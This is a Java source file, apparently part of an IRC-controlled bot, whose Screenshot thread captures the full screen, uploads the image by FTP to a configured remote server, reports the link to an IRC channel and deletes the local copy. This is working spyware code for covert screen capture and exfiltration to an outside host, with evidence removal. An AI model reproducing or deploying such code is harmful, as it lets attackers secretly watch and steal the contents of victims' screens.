package mn.num;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import javax.imageio.ImageIO;

public class Screenshot extends Thread {
    private int seconds;
    private String outFileName;
    public Screenshot(int seconds, String outfileName) {
        outFileName = outfileName;
        this.seconds = seconds;
    }

    public void run() {
        String outFileName = this.outFileName;
        if (outFileName == null)
            IRC.sendMessage(Config.getChannel(), "You must set a output file name!");
        try {
            long time = (long) seconds * 1000L;
            System.out.println((new StringBuilder("Waiting ")).append(time / 1000L).append(" second(s)...").toString());
            try {
                Thread.sleep(time);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        } catch (NumberFormatException nfe) {
            IRC.sendMessage(Config.getChannel(), "Wait time is not a number!");
        }
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        Dimension screenSize = toolkit.getScreenSize();
        Rectangle screenRect = new Rectangle(screenSize);
        Robot robot = null;
        try {
            robot = new Robot();
        } catch (AWTException e1) {
            e1.printStackTrace();
        }
        BufferedImage image = robot.createScreenCapture(screenRect);
        try {
            ImageIO.write(image, "jpg", new File(outFileName));
        } catch (IOException e) {
            e.printStackTrace();
        }
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Saved screen shot (")).append(image.getWidth()).append(" x ").append(image.getHeight()).append(" pixels) to file \"").append(outFileName).append("\".").toString());
        IRC.sendMessage(Config.getChannel(), "Uploading image to FTP server!");
        FTPConnection ftp = new FTPConnection();
        try {
            ftp.connect(Config.getFtpHost());
            ftp.login(Config.getFtpUser(), Config.getFtpPassword());
            String serverFile = Config.getNick() + "" + Misc.randomNumber(99999);
            ftp.uploadFile(Config.getDirLoc() + "Screens/" + serverFile + ".jpg", outFileName);
            ftp.disconnect();
            IRC.sendMessage(Config.getChannel(), "File uploaded, can be acsessed at " + Config.getSite() + "/Screens/" + serverFile + ".jpg");
        } catch (Exception e) {
            IRC.sendMessage(Config.getChannel(), "Error while uploading file to FTP, check settings");
        }
        try {
            File file = new File(outFileName);
            file.delete(); //TODO: must be uncommented
        } catch (Exception e) {
            IRC.sendMessage(Config.getChannel(), "Error while deleting local copy of file!");
        }
        IRC.sendMessage(Config.getChannel(), "Local copy deleted!");
    }
}